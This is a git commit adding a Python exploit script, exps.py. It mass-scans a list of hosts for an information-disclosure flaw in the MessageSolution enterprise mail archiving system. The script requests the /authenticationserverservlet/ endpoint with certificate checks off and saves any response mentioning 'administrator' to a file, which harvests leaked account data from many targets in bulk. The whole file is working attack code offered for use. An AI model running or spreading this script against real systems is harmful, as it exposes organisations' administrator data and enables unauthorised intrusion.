ac62d8c77421c8f6918ec4bd95ee20288f1852eb
menglihua <59153500+dengxmenglihua@users.noreply.github.com>
2021-03-23 16:58:53 +0800

    Add files via upload

---
+++ exps.py
@@ -0,0 +1,49 @@
+import requests
+import sys
+import random
+import re
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+def title():
+    print('+------------------------------------------')
+    print('+  \033[34mVersion: MessageSolution 企业邮件归档管理系统EEA                         \033[0m')
+    print('+  \033[36m使用格式: python3 exp.py                                            \033[0m')
+    print('+  \033[36mUrl:  >>> http://xxx.xxx.xxx.xxx                             \033[0m')
+    print('+------------------------------------------')
+
+
+def POC_1(target_url):
+    vuln_url = target_url + "/authenticationserverservlet/"
+    #print(vuln_url)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+    }
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        if response.status_code == 200 and "administrator" in response.text:
+            print("\033[32m[o] 目标 {} 存在信息泄露 响应为:{}\033[0m".format(target_url, response.text))
+            with open('./output.txt','a') as g:
+                g.write(target_url+'\n'+response.text+'\n----------------------------------\n')
+        else:
+            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
+    except Exception as e:
+        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))
+
+
+
+
+if __name__ == "__main__":
+    title()
+    with open('./input.txt',encoding='utf-8') as f:
+        a=f.readlines()
+        for i in a:
+            b=re.sub(r'\n','',i)
+            if b[-1]=='/':
+                b=b[:-1]
+                #print(b)
+            if 'http' in b:
+                target_url = b
+            else:
+                target_url = 'http://'+b
+            POC_1(target_url)
